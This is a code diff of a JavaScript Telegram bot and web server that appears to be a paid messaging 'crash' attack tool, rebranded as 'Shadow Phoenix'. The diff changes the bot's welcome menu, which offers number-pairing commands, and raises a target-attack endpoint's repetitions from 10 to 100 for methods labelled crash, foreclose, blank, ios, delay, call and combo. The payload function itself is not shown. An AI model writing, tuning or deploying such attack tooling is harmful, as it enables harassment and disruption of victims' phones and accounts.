@@ -383,13 +383,20 @@ bot.use(async (ctx, next) => {
 });
 
 bot.start((ctx) => {
-  ctx.replyWithVideo(
-    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
+  ctx.replyWithPhoto(
+    { url: 'https://imgur.com/a/DafdoWX' },
     {
       caption: `
-welcome to skid-website, i can only help with this
-
-╭─────────
+[  ♱ 𝗦𝗛𝗔𝗗𝗢𝗪 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 ♱  ]
+╭─────────────────────────╸╴
+│ Sᴄʀɪᴘᴛ : Shadow Phoenix
+│ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders
+│ Dᴇᴠᴇʟᴏᴘᴇʀ : @MexxModders
+│ Vᴇʀsɪᴏɴ : 1.0
+│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
+│ Mᴏᴅᴇ : Pᴜʙʟɪᴄ
+│ Mᴏᴅᴇʟ : Jᴀᴠᴀ Sᴄʀɪᴘᴛ
+│ 
 │ 🔹 /pairing <number>
 │ 🔹 /listpairing
 │ 🔹 /delpairing <number>
@@ -398,11 +405,11 @@ welcome to skid-website, i can only help with this
 │ 🔹 /addakun
 │ 🔹 /listakun
 │ 🔹 /delakun <username> <password>
-╰──────────`,
+╰─────────────────────────╸╴`,
       parse_mode: 'Markdown',
       ...Markup.inlineKeyboard([
-        [Markup.button.url('👤 Owner', 'https://t.me/komodigi')],
-        [Markup.button.url('📢 Join Channel', 'https://t.me/xpcommuniti')]
+        [Markup.button.url('👤 Owner', 'https://t.me/DryzxModders')],
+        [Markup.button.url('👤 Owner', 'https://t.me/MexxModders')]
       ])
     }
   );
@@ -886,43 +893,43 @@ app.get("/attack/metode", requireAuth,  async (req, res) => {
 
     switch (metode.toLowerCase()) {
       case "crash":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "foreclose":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "blank":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "ios":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "delay":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "call":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
 
       case "combo":
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
           await MexxDelay(isTarget)
         }
         break;
